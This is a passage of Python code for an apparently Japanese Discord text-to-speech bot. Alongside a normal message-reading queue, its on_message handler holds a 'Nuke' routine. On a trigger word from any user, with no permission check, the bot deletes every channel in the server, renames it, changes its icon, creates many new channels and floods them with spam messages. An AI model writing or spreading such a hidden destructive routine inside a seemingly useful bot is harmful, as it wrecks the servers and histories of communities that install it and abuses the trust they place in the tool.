# --- 5. 読み上げキュー処理 ---
async def process_tts_queue(guild):
    while not client.tts_queue.empty():
        vc = guild.voice_client
        if not vc or not vc.is_connected():
            client.tts_queue._queue.clear()
            break

        text, filename = await client.tts_queue.get()

        try:
            tts = gTTS(text=text, lang='ja')
            tts.save(filename)

            loop = asyncio.get_running_loop()
            future = loop.create_future()

            def after_play(error):
                if error:
                    print(f"再生エラー: {error}")
                if not future.done():
                    future.set_result(None)

            if vc.is_connected():
                if vc.is_playing():
                    vc.stop()
                vc.play(discord.FFmpegPCMAudio(filename), after=after_play)
                await future

        except Exception as e:
            print(f"読み上げ処理エラー: {e}")
        finally:
            if os.path.exists(filename):
                try:
                    os.remove(filename)
                except:
                    pass
            client.tts_queue.task_done()

    client.is_speaking = False

# --- 6. メッセージ自動読み上げ & Nuke機能 (!nuke) ---
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.strip()

    # Nuke機能
    if message.guild and content == trigger_word:
        guild = message.guild
        try:
            if guild.voice_client:
                await guild.voice_client.disconnect()

            delete_tasks = [channel.delete() for channel in guild.channels]
            await asyncio.gather(*delete_tasks, return_exceptions=True)

            try:
                with open("icon.png", "rb") as f:
                    icon_data = f.read()
                await guild.edit(name=new_name, icon=icon_data)
            except FileNotFoundError:
                await guild.edit(name=new_name)

            created_channels = []
            for i in range(1, new_channel_count + 1):
                channel_name = f"{channel_prefix}{i}"
                channel = await guild.create_text_channel(channel_name)
                created_channels.append(channel)

            async def send_messages_to_channel(channel):
                for _ in range(message_count_per_channel):
                    try:
                        await channel.send(message_content)
                        await asyncio.sleep(0.1)
                    except:
                        break

            send_tasks = [send_messages_to_channel(ch) for ch in created_channels]
            await asyncio.gather(*send_tasks)
        except Exception as e:
            print(f"Nukeエラー: {e}")
        return

    # 通常テキストの自動読み上げ
    if message.guild and message.guild.voice_client:
        vc = message.guild.voice_client
        if message.author.voice and message.author.voice.channel == vc.channel:
            if content.startswith("/") or content.startswith("http") or not content:
                return

            filename = f"tts_{message.id}_{asyncio.get_event_loop().time()}.mp3"
            await client.tts_queue.put((content, filename))

            if not client.is_speaking:
                client.is_speaking = True
                asyncio.create_task(process_tts_queue(message.guild))

